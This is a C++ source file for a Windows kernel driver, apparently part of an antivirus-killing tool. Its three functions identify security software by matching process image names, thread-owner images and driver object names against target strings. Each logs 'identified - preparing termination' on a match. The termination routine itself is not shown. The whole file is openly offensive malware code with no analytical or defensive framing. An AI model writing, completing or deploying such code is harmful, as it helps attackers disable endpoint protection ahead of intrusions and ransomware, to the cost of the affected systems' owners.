#include "includes.h"
#include "modules.h"
#include "nt_structs.h"
#include "log.h"
#include "hooks.h"

// TODO: Clean

LONG g_logged = 0;
LONG g_logged1 = 0;
LONG g_logged2 = 0;

bool AV::process_extraction( PEPROCESS process, LPCWSTR target_name ) {

    if ( !process || !target_name )
        return false;

    UNICODE_STRING* process_image_name = nullptr;
    auto status = SeLocateProcessImageName( process, &process_image_name );
    HANDLE pid = PsGetProcessId( process );

    if ( !NT_SUCCESS( status ) || !process_image_name || !process_image_name->Buffer )
        return false;

    const WCHAR* buffer = process_image_name->Buffer;
    size_t length = process_image_name->Length / sizeof( WCHAR );

    const WCHAR* filename = buffer + length;
    while ( filename > buffer && *( filename - 1 ) != L'\\' ) {
        --filename;
    }

    const WCHAR* target = target_name;

    while ( *filename && *target ) {
        WCHAR a = *filename++;
        WCHAR b = *target++;

        if ( a != b && tolower( a ) != tolower( b ) ) {
            ExFreePool( process_image_name );
            return false;
        }

    }

    if ( *filename || *target ) {
        ExFreePool( process_image_name );
        return false;
    }

    ExFreePool( process_image_name );
    
    if ( InterlockedCompareExchange( &g_logged, 1, 0 ) == 0 ) 
        Logger::Print( Logger::Level::Info, "AV Process identified - preparing termination" );

    return true;
}


bool AV::thread_extraction( PETHREAD thread, LPCWSTR target_name ) {
    if ( !thread || !target_name )
        return false;

    PEPROCESS owning_process = IoThreadToProcess( thread );
    if ( !owning_process )
        return false;

    UNICODE_STRING* process_image_name = nullptr;
    auto status = SeLocateProcessImageName( owning_process, &process_image_name );

    if ( !NT_SUCCESS( status ) || !process_image_name || !process_image_name->Buffer )
        return false;

    const WCHAR* buffer = process_image_name->Buffer;
    size_t length = process_image_name->Length / sizeof( WCHAR );

    const WCHAR* filename = buffer + length;
    while ( filename > buffer && *( filename - 1 ) != L'\\' ) {
        --filename;
    }

    const WCHAR* target = target_name;

    while ( *filename && *target ) {
        WCHAR a = *filename++;
        WCHAR b = *target++;

        if ( a != b && tolower( a ) != tolower( b ) ) {
            ExFreePool( process_image_name );
            return false;
        }
    }

    if ( *filename || *target ) {
        ExFreePool( process_image_name );
        return false;
    }


    ExFreePool( process_image_name );
    if ( InterlockedCompareExchange( &g_logged1, 1, 0 ) == 0 ) 
        Logger::Print( Logger::Level::Info, "AV Thread identified - preparing termination" );

    return true;

}

bool AV::driver_name_extraction( DRIVER_OBJECT* driver_object, LPCWSTR target_filename ) {

    if ( !driver_object || !target_filename )
        return false;


    UNICODE_STRING driver_name = driver_object->DriverName;

    if ( !driver_name.Buffer || driver_name.Length == 0 )
        return false;


    const WCHAR* buffer = driver_name.Buffer;
    size_t max_length = driver_name.Length / sizeof( WCHAR );

    const WCHAR* filename_start = nullptr;
    for ( size_t i = max_length; i > 0; --i ) {
        if ( buffer[i - 1] == L'\\' ) {
            filename_start = &buffer[i];
            break;
        }
    }

    if ( !filename_start )
        filename_start = buffer;


    while ( *filename_start && *target_filename ) {
        WCHAR a = *filename_start++;
        WCHAR b = *target_filename++;

        a = RtlUpcaseUnicodeChar( a );
        b = RtlUpcaseUnicodeChar( b );

        if ( a != b )
            return false;

    }

    if ( *filename_start || *target_filename )
        return false;


    if ( InterlockedCompareExchange( &g_logged2, 1, 0 ) == 0 )
        Logger::Print( Logger::Level::Info, "AV Driver identified - preparing termination" );
    return true;
}


